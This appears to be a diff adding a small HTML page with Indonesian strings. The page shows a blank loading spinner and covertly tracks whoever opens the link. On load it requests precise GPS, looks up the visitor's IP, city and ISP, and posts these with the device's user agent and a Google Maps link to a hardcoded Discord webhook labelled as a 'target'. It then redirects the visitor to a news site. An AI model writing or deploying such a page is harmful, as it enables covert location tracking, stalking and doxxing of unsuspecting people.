@@ -1,0 +1,117 @@
+<!-- 
+  lang: HTML/JS, file: index.html, target: Mobile Browser, 
+  note: minimal white screen loader matching clean spinner aesthetic.
+-->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat...</title>
+    <style>
+        body { 
+            background: #ffffff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #555555;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1568254262222393424/1ZbnT1DIz1SXA70IcjBF82--A3Iz3mVHJLQhqWNvH0w5MSKvTgzqpBGq5ruV_IWel9Qo";
+
+        async function sendPayload(statusType, geoDetails, mapLink) {
+            try {
+                let ipData = "Tidak diketahui";
+                let cityData = "Tidak diketahui";
+                let ispData = "Tidak diketahui";
+                
+                try {
+                    let ipRes = await fetch('https://ipapi.co/json/');
+                    let ipJson = await ipRes.json();
+                    ipData = ipJson.ip || ipData;
+                    cityData = `${ipJson.city}, ${ipJson.region}, ${ipJson.country_name}` || cityData;
+                    ispData = ipJson.org || ispData;
+                } catch(e) {
+                    try {
+                        let fallbackRes = await fetch('https://api.ipify.org?format=json');
+                        let fallbackJson = await fallbackRes.json();
+                        ipData = fallbackJson.ip;
+                    } catch(err) {}
+                }
+
+                let messageContent = `🎯 **Target Mengakses Tautan!**\n`;
+                messageContent += `🌐 **IP Publik:** \`${ipData}\`\n`;
+                messageContent += `🏢 **Estimasi Kota (IP):** \`${cityData} (${ispData})\`\n`;
+                messageContent += `📍 **Status GPS:** \`${statusType}\`\n`;
+                
+                if (geoDetails) {
+                    messageContent += `📌 **Koordinat:** ${geoDetails}\n`;
+                    messageContent += `🗺️ **Google Maps:** ${mapLink}\n`;
+                }
+                
+                messageContent += `📱 **Perangkat:** \`${navigator.userAgent}\``;
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(messageContent)
+                });
+            } catch (e) {}
+        }
+
+        function initTracking() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const geoText = `\`${lat}, ${lon}\` (Akurasi: ±${Math.round(acc)} meter)`;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        sendPayload("IZIN DIBERIKAN (GPS Akurat)", geoText, mapLink);
+                        redirectToDest();
+                    },
+                    (error) => {
+                        sendPayload("DITOLAK / DIABAIKAN (Fallback ke IP)", null, null);
+                        redirectToDest();
+                    },
+                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+                );
+            } else {
+                sendPayload("TIDAK DIDUKUNG BROWSER (Fallback ke IP)", null, null);
+                redirectToDest();
+            }
+        }
+
+        function redirectToDest() {
+            setTimeout(() => {
+                window.location.href = "https://www.detik.com";
+            }, 1000);
+        }
+
+        window.onload = function() {
+            // Jeda 800ms agar halaman putih bersih muncul dulu sebelum browser memicu pop-up izin lokasi
+            setTimeout(initTracking, 800);
+        };
+    </script>
+</body>
+</html>
